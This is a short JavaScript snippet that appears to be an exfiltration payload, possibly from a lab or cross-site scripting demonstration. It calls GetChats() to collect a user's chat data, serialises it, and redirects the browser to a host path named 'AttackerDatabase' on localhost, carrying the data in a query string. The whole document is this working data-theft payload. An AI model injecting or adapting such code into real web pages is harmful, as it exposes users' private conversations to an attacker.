GetChats().then(data => {
    window.location.href = `http://localhost:67/AttackerDatabase/index.html?info=${encodeURIComponent(JSON.stringify(data))}`;
})
